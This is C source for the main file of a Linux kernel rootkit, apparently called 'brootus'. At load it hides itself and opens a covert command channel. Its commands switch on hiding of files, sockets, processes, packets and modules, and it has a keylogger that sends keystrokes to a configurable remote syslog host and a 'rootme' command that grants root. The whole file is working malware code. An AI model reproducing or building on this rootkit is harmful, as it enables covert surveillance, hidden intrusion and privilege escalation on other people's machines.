#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/unistd.h>
#include <linux/sched.h>

#include "vt_channel.h"
#include "file_hiding.h"
#include "module_hiding.h"
#include "socket_hiding.h"
#include "process_hiding.h"
#include "packet_hiding.h"
#include "keylogger.h"
#include "rootshell.h"

#define CMD_DELEGATE_ARG(f, arg) static inline void cmd_##f(char* data) { f(arg); }
#define CMD_DELEGATE(f) static inline void cmd_##f(char* data) { f(); }

MODULE_LICENSE("GPL");

// Command delegate
CMD_DELEGATE(enable_file_hiding);
CMD_DELEGATE(disable_file_hiding);
CMD_DELEGATE(enable_socket_hiding);
CMD_DELEGATE(disable_socket_hiding);
CMD_DELEGATE(enable_process_hiding);
CMD_DELEGATE(disable_process_hiding);
CMD_DELEGATE(enable_module_hiding);
CMD_DELEGATE(disable_module_hiding);
CMD_DELEGATE(enable_keylogger);
CMD_DELEGATE(disable_keylogger);
CMD_DELEGATE_ARG(hide_module, &__this_module);
CMD_DELEGATE_ARG(unhide_module, &__this_module);
CMD_DELEGATE(root_me);

void cmd_set_syslog_port(char* port_str)
{
	unsigned short port;
	sscanf(port_str, "%hu", &port);
	set_syslog_port(port);
}

int __init init(void)
{
	// Setup the commands
	// Turn features on/off
	add_command("files_on", cmd_enable_file_hiding);
	add_command("files_off", cmd_disable_file_hiding);
	add_command("sockets_on", cmd_enable_socket_hiding);
	add_command("sockets_off", cmd_disable_socket_hiding);
	add_command("processes_on", cmd_enable_process_hiding);
	add_command("processes_off", cmd_disable_process_hiding);
	add_command("modules_on", cmd_enable_module_hiding);
	add_command("modules_off", cmd_disable_module_hiding);
	add_command("keylogger_on", cmd_enable_keylogger);
	add_command("keylogger_off", cmd_disable_keylogger);

	// For histotical reasons these hide/unhide this module
	add_command("mod_hide", cmd_hide_module);
	add_command("mod_unhide", cmd_unhide_module);

	// Configure hiding
	add_command("prefix", set_file_prefix);
	add_command("ports", set_socket_ports);
	add_command("pids", set_pids);
	add_command("hidemod", set_module_hidden);
	add_command("showmod", set_module_visible);

	// Configure keylogger/syslog
	add_command("syslog_ip", set_syslog_ip);
	add_command("syslog_port", cmd_set_syslog_port);

	// Configure blocked host
	add_command("blocked_host", set_blocked_host_ip);

	// Privilege escalation
	add_command("rootme", cmd_root_me);

	// Initialize the brootus modules
	init_file_hiding();
	init_socket_hiding();
	init_process_hiding();
	init_module_hiding();
	init_keylogger();
	init_packet_hiding();

	// Hide our module
   hide_module(&__this_module);

  // Establish the covert channnel
	init_vt_channel();

	return 0;
}

void __exit cleanup(void)
{
	// Close the covert channel
	finalize_vt_channel();

	// Unload the brootus modules
	finalize_file_hiding();
	finalize_socket_hiding();
	finalize_process_hiding();
	finalize_module_hiding();
	finalize_keylogger();
	finalize_packet_hiding();
}

module_init(init);
module_exit(cleanup);
